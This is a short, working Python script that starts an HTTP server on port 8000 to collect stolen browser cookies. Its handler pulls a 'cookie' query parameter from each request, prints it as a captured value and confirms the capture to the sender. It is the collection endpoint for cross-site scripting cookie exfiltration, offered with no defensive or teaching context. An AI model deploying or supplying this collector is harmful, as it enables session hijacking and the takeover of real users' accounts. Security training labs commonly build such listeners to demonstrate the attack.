import http.server
from urllib.parse import urlparse, parse_qs


class CaptureCookieHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse the query parameters
        query_components = parse_qs(urlparse(self.path).query)
        if "cookie" in query_components:
            cookie_value = query_components["cookie"][0]
            print(f"Captured cookie: {cookie_value}")
        else:
            print(f"No cookie found in the request. Path received: {self.path}")

        # Send response
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Cookie captured successfully!")


# Set up and start the server
server_address = ("", 8000)
httpd = http.server.HTTPServer(server_address, CaptureCookieHandler)
print("Starting server, use <Ctrl-C> to stop")
httpd.serve_forever()
